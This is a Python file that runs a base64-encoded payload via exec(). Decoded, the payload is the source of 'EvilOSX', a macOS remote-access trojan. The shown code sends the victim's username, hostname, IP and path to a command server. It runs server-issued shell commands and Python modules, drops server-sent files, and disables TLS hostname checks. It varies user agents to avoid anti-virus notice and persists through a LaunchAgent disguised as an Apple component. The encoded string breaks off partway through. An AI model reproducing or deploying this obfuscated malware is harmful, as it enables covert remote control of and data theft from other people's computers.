#!/usr/bin/env python
# -*- coding: utf-8 -*-
import base64
exec(base64.b64decode('IyEvdXNyL2Jpbi9lbnYgcHl0aG9uCiMgLSotIGNvZGluZzogdXRmLTggLSotCiIiIkV2aWxPU1ggaXMgYSBwdXJlIHB5dGhvbiwgcG9zdC1leHBsb2l0YXRpb24sIFJBVCAoUmVtb3RlIEFkbWluaXN0cmF0aW9uIFRvb2wpIGZvciBtYWNPUyAvIE9TWC4iIiIKIyBSYW5kb20gSGFzaDogTkRobklnYTc1QlV6SEhhajNvNEJaWjlPUmlKeURERVZwWXl4N1RGZU9KbkxUc3hocXFPUk5LSU9XQwpfX2F1dGhvcl9fID0gIk1hcnRlbjRuNiIKX19saWNlbnNlX18gPSAiR1BMdjMiCl9fdmVyc2lvbl9fID0gIjEuMS4wIgoKaW1wb3J0IHRpbWUKaW1wb3J0IHVybGxpYjIKaW1wb3J0IHVybGxpYgppbXBvcnQgcmFuZG9tCmltcG9ydCBnZXRwYXNzCmltcG9ydCB1dWlkCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCB0aHJlYWRpbmcKaW1wb3J0IHRyYWNlYmFjawppbXBvcnQgb3MKaW1wb3J0IGpzb24KaW1wb3J0IGJhc2U2NApmcm9tIFN0cmluZ0lPIGltcG9ydCBTdHJpbmdJTwppbXBvcnQgc3lzCmltcG9ydCBzc2wKaW1wb3J0IGxvZ2dpbmcKClNFUlZFUl9IT1NUID0gImxvY2FsaG9zdCIKU0VSVkVSX1BPUlQgPSAxMzM3CkRFVkVMT1BNRU5UID0gRmFsc2UKTEFVTkNIX0FHRU5UX05BTUUgPSAiY29tLmFwcGxlLkV2aWxPU1giCgpDT01NQU5EX0lOVEVSVkFMID0gMC41ICAjIEludGVydmFsIGluIHNlY29uZHMgdG8gY2hlY2sgZm9yIGNvbW1hbmRzLgpJRExFX1RJTUUgPSA2MCAgIyBUaW1lIGluIHNlY29uZHMgYWZ0ZXIgd2hpY2ggdGhlIGNsaWVudCB3aWxsIGJlY29tZSBpZGxlLgoKTUVTU0FHRV9JTkZPID0gIlwwMzNbOTRtIiArICJbSV0gIiArICJcMDMzWzBtIgpNRVNTQUdFX0FUVEVOVElPTiA9ICJcMDMzWzkxbSIgKyAiWyFdICIgKyAiXDAzM1swbSIKCiMgTG9nZ2luZwpsb2dnaW5nLmJhc2ljQ29uZmlnKGZvcm1hdD0iWyUobGV2ZWxuYW1lKXNdICUoZnVuY05hbWUpczolKGxpbmVubylzIC0gJShtZXNzYWdlKXMiLCBsZXZlbD1sb2dnaW5nLkRFQlVHKQpsb2cgPSBsb2dnaW5nLmdldExvZ2dlcihfX25hbWVfXykKCgpkZWYgcmVjZWl2ZV9jb21tYW5kKCk6CiAgICAiIiJSZWNlaXZlcyBhIGNvbW1hbmQgdG8gZXhlY3V0ZSBmcm9tIHRoZSBzZXJ2ZXIuCgogICAgOnJldHVybiBBIGNvbW1hbmQgb2JqZWN0LgogICAgIiIiCiAgICByZXF1ZXN0X3BhdGggPSAiaHR0cHM6Ly8lczolcy9hcGkvZ2V0X2NvbW1hbmQiICUgKFNFUlZFUl9IT1NULCBTRVJWRVJfUE9SVCkKICAgIGhlYWRlcnMgPSB7IlVzZXItQWdlbnQiOiBfZ2V0X3JhbmRvbV91c2VyX2FnZW50KCl9CgogICAgdXNlcm5hbWUgPSBydW5fY29tbWFuZCgid2hvYW1pIikKICAgIGhvc3RuYW1lID0gcnVuX2NvbW1hbmQoImhvc3RuYW1lIikKICAgIHJlbW90ZV9pcCA9IHJ1bl9jb21tYW5kKCJjdXJsIC1zIGh0dHBzOi8vaWNhbmhhemlwLmNvbS8gLS1jb25uZWN0LXRpbWVvdXQgMyIpCiAgICBjdXJyZW50X3BhdGggPSBydW5fY29tbWFuZCgicHdkIikKCiAgICBpZiByZW1vdGVfaXAgPT0gIiI6CiAgICAgICAgcmVtb3RlX2lwID0gIlVua25vd24iCgogICAgIyBTZW5kIHRoZSBzZXJ2ZXIgc29tZSBiYXNpYyBpbmZvcm1hdGlvbiBhYm91dCB0aGlzIGNsaWVudC4KICAgIGRhdGEgPSB1cmxsaWIudXJsZW5jb2RlKAogICAgICAgIHsiY2xpZW50X2lkIjogZ2V0X3VpZCgpLCAidXNlcm5hbWUiOiB1c2VybmFtZSwgImhvc3RuYW1lIjogaG9zdG5hbWUsCiAgICAgICAgICJyZW1vdGVfaXAiOiByZW1vdGVfaXAsICJwYXRoIjogY3VycmVudF9wYXRofQogICAgKQoKICAgICMgRG9uJ3QgY2hlY2sgdGhlIGhvc3RuYW1lIHdoZW4gdmFsaWRhdGluZyB0aGUgQ0EuCiAgICBzc2wubWF0Y2hfaG9zdG5hbWUgPSBsYW1iZGEgY2VydCwgaG9zdG5hbWU6IFRydWUKCiAgICByZXF1ZXN0ID0gdXJsbGliMi5SZXF1ZXN0KHVybD1yZXF1ZXN0X3BhdGgsIGhlYWRlcnM9aGVhZGVycywgZGF0YT1kYXRhKQogICAgcmVzcG9uc2UgPSB1cmxsaWIyLnVybG9wZW4ocmVxdWVzdCwgY2FmaWxlPWdldF9jYV9maWxlKCkpCgogICAgcmVzcG9uc2VfbGluZSA9IHJlc3BvbnNlLnJlYWRsaW5lKCkucmVwbGFjZSgiXG4iLCAiIikgICMgQ2FuJ3QgYmUgcmVhZCB0d2ljZS4KICAgIHJlc3BvbnNlX2hlYWRlcnMgPSByZXNwb25zZS5pbmZvKCkuZGljdAoKICAgIGlmICJjb250ZW50LWRpc3Bvc2l0aW9uIiBpbiByZXNwb25zZV9oZWFkZXJzIGFuZCAiYXR0YWNobWVudCIgaW4gcmVzcG9uc2VfaGVhZGVyc1siY29udGVudC1kaXNwb3NpdGlvbiJdOgogICAgICAgICMgVGhlIHNlcnZlciBzZW50IHVzIGEgZmlsZSB0byBkb3dubG9hZCAodXBsb2FkIG1vZHVsZSkuCiAgICAgICAgZGVjb2RlZF9oZWFkZXIgPSBiYXNlNjQuYjY0ZGVjb2RlKHJlc3BvbnNlX2hlYWRlcnNbIngtdXBsb2FkLW1vZHVsZSJdKS5yZXBsYWNlKCJcbiIsICIiKQoKICAgICAgICBvdXRwdXRfZm9sZGVyID0gb3MucGF0aC5leHBhbmR1c2VyKGRlY29kZWRfaGVhZGVyLnNwbGl0KCI6IilbMV0pCiAgICAgICAgb3V0cHV0X25hbWUgPSBvcy5wYXRoLmJhc2VuYW1lKGRlY29kZWRfaGVhZGVyLnNwbGl0KCI6IilbMl0pCiAgICAgICAgb3V0cHV0X2ZpbGUgPSBvdXRwdXRfZm9sZGVyICsgIi8iICsgb3V0cHV0X25hbWUKCiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKG91dHB1dF9mb2xkZXIpOgogICAgICAgICAgICBzZW5kX3Jlc3BvbnNlKE1FU1NBR0VfQVRURU5USU9OICsgIkZhaWxlZCB0byB1cGxvYWQgZmlsZTogaW52YWxpZCBvdXRwdXQgZm9sZGVyLiIsICJ1cGxvYWQiKQogICAgICAgIGVsaWYgb3MucGF0aC5leGlzdHMob3V0cHV0X2ZpbGUpOgogICAgICAgICAgICBzZW5kX3Jlc3BvbnNlKE1FU1NBR0VfQVRURU5USU9OICsgIkZhaWxlZCB0byB1cGxvYWQgZmlsZTogYSBmaWxlIHdpdGggdGhhdCBuYW1lIGFscmVhZHkgZXhpc3RzLiIsICJ1cGxvYWQiKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHdpdGggb3BlbihvdXRwdXRfZmlsZSwgIndiIikgYXMgb3V0cHV0OgogICAgICAgICAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgICAgICAgICBkYXRhID0gcmVzcG9uc2UucmVhZCg0MDk2KQoKICAgICAgICAgICAgICAgICAgICBpZiBub3QgZGF0YToKICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICBvdXRwdXQud3JpdGUoZGF0YSkKCiAgICAgICAgICAgIHNlbmRfcmVzcG9uc2UoTUVTU0FHRV9JTkZPICsgIkZpbGUgd3JpdHRlbiB0bzogIiArIG91dHB1dF9maWxlLCAidXBsb2FkIikKICAgICAgICByZXR1cm4gTm9uZQogICAgZWxzZToKICAgICAgICBpZiBub3QgcmVzcG9uc2VfbGluZSBvciByZXNwb25zZV9saW5lID09ICJZb3UgZHVuIGdvb2ZlZC4iOgogICAgICAgICAgICByZXR1cm4gTm9uZQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGpzb25fcmVzcG9uc2UgPSBqc29uLmxvYWRzKHJlc3BvbnNlX2xpbmUpCgogICAgICAgICAgICBsb2cuZGVidWcoIlJhdyBjb21tYW5kIEpTT046ICVzIiwgc3RyKGpzb25fcmVzcG9uc2UpKQoKICAgICAgICAgICAgIyBQYXJzZSB0aGUgSlNPTiByZXNwb25zZSBpbnRvIGEgY29tbWFuZCBvYmplY3QuCiAgICAgICAgICAgIHJldHVybiBDb21tYW5kKGpzb25fcmVzcG9uc2VbImlkIl0sIGJhc2U2NC5iNjRkZWNvZGUoanNvbl9yZXNwb25zZVsiY29tbWFuZCJdKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAganNvbl9yZXNwb25zZVsibW9kdWxlX25hbWUiXSwgVHJ1ZSBpZiBqc29uX3Jlc3BvbnNlWyJpc190YXNrIl0gPT0gMSBlbHNlIEZhbHNlKQoKCmNsYXNzIENvbW1hbmQ6CiAgICAiIiJUaGlzIGNsYXNzIHJlcHJlc2VudHMgYSBjb21tYW5kIHNlbnQgYnkgdGhlIHNlcnZlci4iIiIKCiAgICBkZWYgX19pbml0X18oc2VsZiwgY2xpZW50X2lkLCBjb21tYW5kLCBtb2R1bGVfbmFtZT0iIiwgaXNfdGFzaz1GYWxzZSk6CiAgICAgICAgIiIiCiAgICAgICAgOnBhcmFtIGNsaWVudF9pZCBUaGUgSUQgb2YgdGhlIGNsaWVudCB3aGljaCBzaG91bGQgZXhlY3V0ZSB0aGlzIGNvbW1hbmQuCiAgICAgICAgOnBhcmFtIGNvbW1hbmQgVGhlIGNvbW1hbmQgKG9yIG1vZHVsZSBjb2RlKSB0byBleGVjdXRlIG9uIHRoZSBjbGllbnQuCiAgICAgICAgOnBhcmFtIG1vZHVsZV9uYW1lIFRoZSBuYW1lIG9mIHRoZSBtb2R1bGUgYmVpbmcgZXhlY3V0ZWQuCiAgICAgICAgOnBhcmFtIGlzX3Rhc2sgVHJ1ZSBpZiB0aGlzIG1vZHVsZSBpcyBhIHRhc2suCiAgICAgICAgIiIiCiAgICAgICAgc2VsZi5pZCA9IGNsaWVudF9pZAogICAgICAgIHNlbGYuY29tbWFuZCA9IGNvbW1hbmQKICAgICAgICBzZWxmLm1vZHVsZV9uYW1lID0gbW9kdWxlX25hbWUKICAgICAgICBzZWxmLmlzX3Rhc2sgPSBpc190YXNrCgoKZGVmIGdldF91aWQoKToKICAgICIiIjpyZXR1cm4gVGhlIHVuaXF1ZSBJRCBvZiB0aGlzIGNsaWVudC4iIiIKICAgICMgVGhlIGNsaWVudCBtdXN0IGJlIGNvbm5lY3RlZCB0byBXaUZpIGFueXdheSwgc28gZ2V0bm9kZSBpcyBmaW5lLgogICAgIyBTZWUgaHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMi9saWJyYXJ5L3V1aWQuaHRtbCN1dWlkLmdldG5vZGUKICAgIHJldHVybiBnZXRwYXNzLmdldHVzZXIoKSArICItIiArIHN0cih1dWlkLmdldG5vZGUoKSkKCgpkZWYgX2dldF9yYW5kb21fdXNlcl9hZ2VudCgpOgogICAgIiIiOnJldHVybiBBIHJhbmRvbSB1c2VyLWFnZW50IHN0cmluZy4iIiIKICAgICMgVXNlZCB0byBob3BlZnVsbHkgbWFrZSBhbnRpLXZpcnVzIGxlc3Mgc3VzcGljaW91cyBvZiBIVFRQUyByZXF1ZXN0cy4KICAgICMgVGFrZW4gZnJvbSBodHRwczovL3RlY2hibG9nLndpbGxzaG91c2UuY29tLzIwMTIvMDEvMDMvbW9zdC1jb21tb24tdXNlci1hZ2VudHMvCiAgICB1c2VyX2FnZW50cyA9IFsKICAgICAgICAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzYzLjAuMzIzOS44NCBTYWZhcmkvNTM3LjM2IiwKICAgICAgICAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzYzLjAuMzIzOS4xMzIgU2FmYXJpLzUzNy4zNiIsCiAgICAgICAgIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjU3LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvNTcuMCIsCiAgICAgICAgIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzYzLjAuMzIzOS44NCBTYWZhcmkvNTM3LjM2IiwKICAgICAgICAiTW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTNfMikgQXBwbGVXZWJLaXQvNjA0LjQuNyAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vMTEuMC4yIFNhZmFyaS82MDQuNC43IiwKICAgICAgICAiTW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTNfMikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzYzLjAuMzIzOS44NCBTYWZhcmkvNTM3LjM2IiwKICAgICAgICAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0OyBydjo1Ny4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzU3LjAiLAogICAgICAgICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNjMuMC4zMjM5LjEwOCBTYWZhcmkvNTM3LjM2IgogICAgXQogICAgcmV0dXJuIHJhbmRvbS5jaG9pY2UodXNlcl9hZ2VudHMpCgoKZGVmIHJ1bl9jb21tYW5kKGNvbW1hbmQsIGNsZWFudXA9VHJ1ZSwga2lsbF9vbl90aW1lb3V0PVRydWUpOgogICAgIiIiUnVucyBhIHN5c3RlbSBjb21tYW5kIGFuZCByZXR1cm5zIGl0cyByZXNwb25zZS4iIiIKICAgIGlmIGxlbihjb21tYW5kKSA+IDMgYW5kIGNvbW1hbmRbMDozXSA9PSAiY2QgIjoKICAgICAgICB0cnk6CiAgICAgICAgICAgIG9zLmNoZGlyKG9zLnBhdGguZXhwYW5kdXNlcihjb21tYW5kWzM6XSkpCiAgICAgICAgICAgIHJldHVybiAiRGlyZWN0b3J5IGNoYW5nZWQuIgogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZXg6CiAgICAgICAgICAgIGxvZy5lcnJvcihzdHIoZXgpKQogICAgICAgICAgICByZXR1cm4gc3RyKGV4KQogICAgZWxzZToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHByb2Nlc3MgPSBzdWJwcm9jZXNzLlBvcGVuKGNvbW1hbmQsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLlBJUEUsIHNoZWxsPVRydWUpCiAgICAgICAgICAgIHRpbWVyID0gTm9uZQoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgaWYga2lsbF9vbl90aW1lb3V0OgogICAgICAgICAgICAgICAgICAgICMgS2lsbCBwcm9jZXNzIGFmdGVyIDUgc2Vjb25kcyAoaW4gY2FzZSBpdCBoYW5ncykuCiAgICAgICAgICAgICAgICAgICAgdGltZXIgPSB0aHJlYWRpbmcuVGltZXIoNSwgbGFtYmRhIHByb2Nlc3M6IHByb2Nlc3Mua2lsbCgpLCBbcHJvY2Vzc10pCiAgICAgICAgICAgICAgICAgICAgdGltZXIuc3RhcnQoKQogICAgICAgICAgICAgICAgc3Rkb3V0LCBzdGRlcnIgPSBwcm9jZXNzLmNvbW11bmljYXRlKCkKICAgICAgICAgICAgICAgIHJlc3BvbnNlID0gc3Rkb3V0ICsgc3RkZXJyCgogICAgICAgICAgICAgICAgaWYgY2xlYW51cDoKICAgICAgICAgICAgICAgICAgICByZXR1cm4gcmVzcG9uc2UucmVwbGFjZSgiXG4iLCAiIikKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgaWYgbGVuKHJlc3BvbnNlLnNwbGl0KCJcbiIpKSA9PSAyOiAgIyBSZXNwb25zZSBpcyBvbmUgbGluZS4KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHJlc3BvbnNlLnJlcGxhY2UoIlxuIiwgIiIpCiAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHJlc3BvbnNlCiAgICAgICAgICAgIGZpbmFsbHk6CiAgICAgICAgICAgICAgICBpZiB0aW1lcjoKICAgICAgICAgICAgICAgICAgICB0aW1lci5jYW5jZWwoKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZXg6CiAgICAgICAgICAgIGxvZy5lcnJvcihzdHIoZXgpKQogICAgICAgICAgICByZXR1cm4gc3RyKGV4KQoKCmRlZiBydW5fbW9kdWxlKG1vZHVsZV9jb2RlKToKICAgICIiIkV4ZWN1dGVzIGEgbW9kdWxlIHNlbnQgYnkgdGhlIHNlcnZlci4KCiAgICA6cmV0dXJuIFRoZSBtb2R1bGUncyBvdXRwdXQuCiAgICA6dHlwZSBtb2R1bGVfY29kZSBzdHIKICAgICIiIgogICAgdHJ5OgogICAgICAgIG5ld19zdGRvdXQgPSBTdHJpbmdJTygpCiAgICAgICAgbmV3X3N0ZGVyciA9IFN0cmluZ0lPKCkKCiAgICAgICAgb2xkX3N0ZG91dCA9IHN5cy5zdGRvdXQKICAgICAgICBvbGRfc3RkZXJyID0gc3lzLnN0ZGVycgoKICAgICAgICAjIFJlZGlyZWN0IG91dHB1dC4KICAgICAgICBzeXMuc3Rkb3V0ID0gbmV3X3N0ZG91dAogICAgICAgIHN5cy5zdGRlcnIgPSBuZXdfc3RkZXJyCgogICAgICAgIGV4ZWMgbW9kdWxlX2NvZGUgaW4gZ2xvYmFscygpCiAgICAgICAgIyBUT0RPIC0gRmluZCBhIHdheSB0byByZW1vdmUgdGhlIGV4ZWN1dGVkIGNvZGUgZnJvbSBnbG9iYWxzLCBwcm9iYWJseSB3b24ndCBoYXBwZW4gdGhvdWdoLgoKICAgICAgICAjIFJlc3RvcmUgb3V0cHV0LgogICAgICAgIHN5cy5zdGRvdXQgPSBvbGRfc3Rkb3V0CiAgICAgICAgc3lzLnN0ZGVyciA9IG9sZF9zdGRlcnIKCiAgICAgICAgcmVzcG9uc2UgPSBuZXdfc3Rkb3V0LmdldHZhbHVlKCkgKyBuZXdfc3RkZXJyLmdldHZhbHVlKCkKICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgcmVzcG9uc2UgPSBNRVNTQUdFX0FUVEVOVElPTiArICJFcnJvciBleGVjdXRpbmcgbW9kdWxlOiAiICsgdHJhY2ViYWNrLmZvcm1hdF9leGMoKQogICAgcmV0dXJuIHJlc3BvbnNlCgoKY2xhc3MgS2lsbGFibGVUaHJlYWQodGhyZWFkaW5nLlRocmVhZCk6CiAgICAiIiJTdWJjbGFzcyBvZiB0aHJlYWRpbmcuVGhyZWFkIHdpdGggYSBraWxsKCkgbWV0aG9kLgoKICAgIFNlZSBodHRwczovL21haWwucHl0aG9uLm9yZy9waXBlcm1haWwvcHl0aG9uLWxpc3QvMjAwNC1NYXkvMjgxOTQ0Lmh0bWwKICAgICIiIgoKICAgIGRlZiBfX2luaXRfXyhzZWxmLCAqYXJncywgKiprZXl3b3Jkcyk6CiAgICAgICAgdGhyZWFkaW5nLlRocmVhZC5fX2luaXRfXyhzZWxmLCAqYXJncywgKiprZXl3b3JkcykKICAgICAgICBzZWxmLmtpbGxlZCA9IEZhbHNlCgogICAgZGVmIHN0YXJ0KHNlbGYpOgogICAgICAgICIiIlN0YXJ0IHRoZSB0aHJlYWQuIiIiCiAgICAgICAgc2VsZi5fX3J1bl9iYWNrdXAgPSBzZWxmLnJ1bgogICAgICAgIHNlbGYucnVuID0gc2VsZi5fX3J1biAgIyBGb3JjZSB0aGUgdGhyZWFkIHRvIGluc3RhbGwgb3VyIHRyYWNlLgogICAgICAgIHRocmVhZGluZy5UaHJlYWQuc3RhcnQoc2VsZikKCiAgICBkZWYgX19ydW4oc2VsZik6CiAgICAgICAgIiIiSGFja2VkIHJ1biBmdW5jdGlvbiB3aGljaCBpbnN0YWxscyB0aGUgdHJhY2UuIiIiCiAgICAgICAgc3lzLnNldHRyYWNlKHNlbGYuZ2xvYmFsdHJhY2UpCiAgICAgICAgc2VsZi5fX3J1bl9iYWNrdXAoKQogICAgICAgIHNlbGYucnVuID0gc2VsZi5fX3J1bl9iYWNrdXAKCiAgICBkZWYgZ2xvYmFsdHJhY2Uoc2VsZiwgZnJhbWUsIHdoeSwgYXJnKToKICAgICAgICBpZiB3aHkgPT0gImNhbGwiOgogICAgICAgICAgICByZXR1cm4gc2VsZi5sb2NhbHRyYWNlCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcmV0dXJuIE5vbmUKCiAgICBkZWYgbG9jYWx0cmFjZShzZWxmLCBmcmFtZSwgd2h5LCBhcmcpOgogICAgICAgIGlmIHNlbGYua2lsbGVkOgogICAgICAgICAgICBpZiB3aHkgPT0gImxpbmUiOgogICAgICAgICAgICAgICAgcmFpc2UgU3lzdGVtRXhpdCgpCiAgICAgICAgcmV0dXJuIHNlbGYubG9jYWx0cmFjZQoKICAgIGRlZiBraWxsKHNlbGYpOgogICAgICAgIHNlbGYua2lsbGVkID0gVHJ1ZQoKCmRlZiBzZW5kX3Jlc3BvbnNlKHJlc3BvbnNlLCBtb2R1bGVfbmFtZT0iIik6CiAgICAiIiJTZW5kcyBhIHJlc3BvbnNlIGluIEpTT04gdG8gdGhlIHNlcnZlciwgYmFzZTY0IGVuY29kZXMgdGhlIHJlc3BvbnNlLgoKICAgIDp0eXBlIHJlc3BvbnNlIHN0cgogICAgOnR5cGUgbW9kdWxlX25hbWUgc3RyCiAgICAiIiIKICAgIHJlcXVlc3RfcGF0aCA9ICJodHRwczovLyVzOiVzL2FwaS9yZXNwb25zZSIgJSAoU0VSVkVSX0hPU1QsIFNFUlZFUl9QT1JUKQogICAgaGVhZGVycyA9IHsiVXNlci1BZ2VudCI6IF9nZXRfcmFuZG9tX3VzZXJfYWdlbnQoKX0KCiAgICBqc29uX2RhdGEgPSBqc29uLmR1bXBzKHsicmVzcG9uc2UiOiBiYXNlNjQuYjY0ZW5jb2RlKHJlc3BvbnNlKSwgIm1vZHVsZV9uYW1lIjogbW9kdWxlX25hbWV9KQogICAgZGF0YSA9IHVybGxpYi51cmxlbmNvZGUoeyJvdXRwdXQiOiBiYXNlNjQuYjY0ZW5jb2RlKGpzb25fZGF0YSl9KQoKICAgIHJlcXVlc3QgPSB1cmxsaWIyLlJlcXVlc3QodXJsPXJlcXVlc3RfcGF0aCwgaGVhZGVycz1oZWFkZXJzLCBkYXRhPWRhdGEpCiAgICB1cmxsaWIyLnVybG9wZW4ocmVxdWVzdCwgY2FmaWxlPWdldF9jYV9maWxlKCkpCgoKZGVmIHNldHVwX3BlcnNpc3RlbmNlKCk6CiAgICAiIiJNYWtlcyBFdmlsT1NYIHBlcnNpc3Qgc3lzdGVtIHJlYm9vdHMuIiIiCiAgICBydW5fY29tbWFuZCgibWtkaXIgLXAgJXMiICUgZ2V0X3Byb2dyYW1fZGlyZWN0b3J5KCkpCiAgICBydW5fY29tbWFuZCgibWtkaXIgLXAgJXMiICUgZ2V0X2xhdW5jaF9hZ2VudF9kaXJlY3RvcnkoKSkKCiAgICAjIENyZWF0ZSBsYXVuY2ggYWdlbnQKICAgIGxvZy5kZWJ1ZygiQ3JlYXRpbmcgbGF1bmNoIGFnZW50Li4uIikKCiAgICBsYXVuY2hfYWdlbnRfY3JlYXRlID0gIiIiXAogICAgICAgIDw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04Ij8+CiAgICAgICAgPCFET0NUWVBFIHBsaXN0IFBVQkxJQyAiLS8vQXBwbGUvL0RURCBQTElTVCAxLjAvL0VOIiAiaHR0cDovL3d3dy5hcHBsZS5jb20vRFREcy9Qcm9wZXJ0eUxpc3QtMS4wLmR0ZCI+CiAgICAgICAgPHBsaXN0IHZlcnNpb249IjEuMCI+CiAgICAgICAgPGRpY3Q+CiAgICAgICAgICAgIDxrZXk+S2VlcEFsaXZlPC9rZXk+CiAgICAgICAgICAgIDx0cnVlLz4KICAgICAgICAgICAgPGtleT5MYWJlbDwva2V5PgogICAgICAgICAgICA8c3RyaW5nPiVzPC9zdHJpbmc+CiAgICAgICAgICAgIDxrZXk+UHJvZ3JhbUFyZ3VtZW50czwva2V5PgogICAgICAgICAgICA8YXJyYXk+CiAgICAgICAgICAgICAgICA8c3RyaW5nPiVzPC9zdHJpbmc+CiAgICAgICAgICAgIDwvYXJyYXk+CiAgICAgICAgICAgIDxrZXk+UnVuQXRMb2FkPC9rZXk+CiAgICAgICAgICAgIDx0cnVlLz4KICAgICAgICA8L2RpY3Q+CiAgICAgICAgPC9wbGlzdD4KICAgICAgICAiIiIgJSAoTEFVTkNIX0FHRU5UX05BTUUsIGdldF9wcm9ncmFtX2ZpbGUoKSkKCiAgICB3aXRoIG9wZW4oZ2V0X2xhdW5jaF9hZ2VudF9maWxlKCksICJ3IikgYXMgb3Blbl9maWxlOgogICAgICAgIG9wZW5fZmlsZS53cml0ZShsYXVuY2hfYWdlbnRfY3JlYXRlKQoKICAgICMgTW92ZSBFdmlsT1NYCiAgICBsb2cuZGVidWcoIk1vdmluZyBFdmlsT1NYLi4uIikKCiAgICBpZiBERVZFTE9QTUVOVDoKICAgICAgICB3aXRoIG9wZW4oX19maWxlX18sICJyYiIpIGFzIGlucHV0X2ZpbGUsIG9wZW4oZ2V0X3Byb2dyYW1fZmlsZSgpLCAid2IiKSBhcyBvdXRwdXRfZmlsZToKICAgICAgICAgICAgb3V0cHV0X2ZpbGUud3JpdGUoaW5wdXRfZmlsZS5yZWFkKCkpCiAgICBlbHNlOgogICAgICAgIG9zLnJlbmFtZShfX2ZpbGVfXywgZ2V0X3Byb2dyYW1fZmlsZSgpKQogICAgb3MuY2htb2QoZ2V0X3Byb2dyYW1fZmlsZSgpLCAwNzc3KQoKICAgICMgTG9hZCBsYXVuY2ggYWdlbnQKICAgIGxvZy5kZWJ1ZygiTG9hZGluZyBsYXVuY2ggYWdlbnQuLi4iKQoKICAgIG91dHB1dCA9IHJ1bl9jb21tYW5kKCJsYXVuY2hjdGwgbG9hZCAtdyAlcyIgJSBnZXRfbGF1bmNoX2FnZW50X2ZpbGUoKSkKCiAgICBpZiBvdXRwdXQgPT0gIiI6CiAgICAgICAgaWYgcnVuX2NvbW1hbmQoImxhdW5jaGN0bCBsaXN0IHwgZ3JlcCAtdyAlcyIgJSBMQVVOQ0hfQUdFTlRfTkFNRSk6CiAgICAgICAgICAgIGxvZy5kZWJ1ZygiRG9uZSEiKQogICAgICAgICAgICBzeXMuZXhpdCgwKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGxvZy5lcnJvcigiRmFpbGVkIHRvIGxvYWQgbGF1bmNoIGFnZW50LiIpCiAgICBlbGlmICJhbHJlYWR5IGxvYWRlZCIgaW4gb3V0cHV0Lmxvd2VyKCk6CiAgICAgICAgbG9nLmVycm9yKCJFdmlsT1NYIGlzIGFscmVhZHkgbG9hZGVkLiIpCiAgICAgICAgc3lzLmV4aXQoMCkKICAgIGVsc2U6CiAgICAgICAgbG9nLmVycm9yKCJVbmV4cGVjdGVkIG91dHB1dDogJXMiLCBvdXRwdXQpCiAgICAgICAgcGFzcwoKCmRlZiBnZXRfcHJvZ3JhbV9kaXJlY3RvcnkoKToKICAgICIiIjpyZXR1cm4gVGhlIHByb2dyYW0gZGlyZWN0b3J5IHdoZXJlIEV2aWxPU1ggbGl2ZXMuIiIiCiAgICByZXR1cm4gb3MucGF0aC5leHBhbmR1c2VyKCJ+L0xpYnJhcnkvQ29udGFpbmVycy8uRXZpbE9TWCIpCgoKZGVmIGdldF9wcm9ncmFtX2ZpbGUoKToKICAgICIiIjpyZXR1cm4gVGhlIHBhdGggdG8gdGhlIEV2aWxPU1ggZmlsZS4iIiIKICAgIHJldHVybiBnZXRfcHJvZ3JhbV9kaXJlY3RvcnkoKSArICIvRXZpbE9TWCIKCgpkZWYgZ2V0X2xhdW5jaF9hZ2VudF9kaXJlY3RvcnkoKToKICAgICIiIjpyZXR1cm4gVGhlIGRpcmVjdG9yeSB3aGVyZSB0aGUgbGF1bmNoIGFnZW50IGxpdmVzLiIiIgogICAgcmV0dXJuIG9zLnBhdGguZXhwYW5kdXNlcigifi9MaWJyYXJ5L0xhdW5jaEFnZW50cyIpCgoKZGVmIGdldF9sYXVuY2hfYWdlbnRfZmlsZSgpOgogICAgIiIiOnJldHVybiBUaGUgcGF0aCB0byB0aGUgbGF1bmNoIGFn